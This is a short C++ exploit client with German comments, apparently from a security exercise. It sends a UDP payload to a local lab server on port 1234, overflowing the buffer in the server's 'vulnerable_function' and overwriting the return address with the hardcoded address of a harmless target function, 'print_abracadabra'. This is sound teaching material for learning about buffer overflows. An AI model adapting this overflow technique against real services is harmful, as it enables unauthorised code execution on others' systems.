#include <arpa/inet.h>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 1234

//----------------------------------Szenario------------------------------------------
/**
 * Dieses Szenario beschreibt die Interaktion zwischen einem UDP-Server und einem Client.
 * Der Server empfängt Nachrichten und verarbeitet sie, während der Client Daten sendet.
 *
 * Der Server enthält eine Funktion `vulnerable_function`, die unsicher ist, da sie Daten
 * ohne Längenüberprüfung kopiert. Dies führt zu einer potenziellen
 * Buffer-Overflow-Sicherheitslücke.
 * Ziel des Exploits ist es, die Funktion `print_abracadabra` aufzurufen.
 */

//----------------------------------Ablauf------------------------------------------
/*
 * 1. Der Server wird gestartet und lauscht auf Port 1234.
 * 2. Der Client verbindet sich mit dem Server und sendet Nachrichten.
 * 3. Der Server empfängt die Nachrichten und verarbeitet sie in der Funktion
 * `vulnerable_function`.
 * 4. Wenn ein Angreifer speziell gestaltete Daten sendet, kann er möglicherweise die
 * Sicherheitslücke ausnutzen, um unautorisierten Code auszuführen oder die Ziel-Funktion
 * aufzurufen.
 */

int main(int, char* argv[])
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket erstellen fehlgeschlagen");
        return 1;
    }

    sockaddr_in server_addr = {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    size_t PAYLOAD_OFFSET_SIZE = std::strtoul(argv[1], nullptr, 10);

    std::vector<char> payload(PAYLOAD_OFFSET_SIZE + 8);

    std::memset(payload.data(), 'A', PAYLOAD_OFFSET_SIZE);

    uintptr_t func_addr = 0x0000000000401246; // Adresse von print_abracadabra
    *(uintptr_t*)(payload.data() + PAYLOAD_OFFSET_SIZE) = func_addr;

    // Debug-Ausgabe der gesendeten Adresse
    std::cout << "[DEBUG] Vollständiger Payload vor dem Senden:" << std::endl;
    for (size_t i = 0; i < PAYLOAD_OFFSET_SIZE + 8; i++) {
        std::printf("%02x ", (unsigned char)payload[i]);
    }
    std::cout << std::endl;

    sendto(sockfd, payload.data(), PAYLOAD_OFFSET_SIZE + 8, 0, (struct sockaddr*)&server_addr,
           sizeof(server_addr));

    std::cout << "[INFO] Payload gesendet!" << std::endl;
    close(sockfd);
    return 0;
}
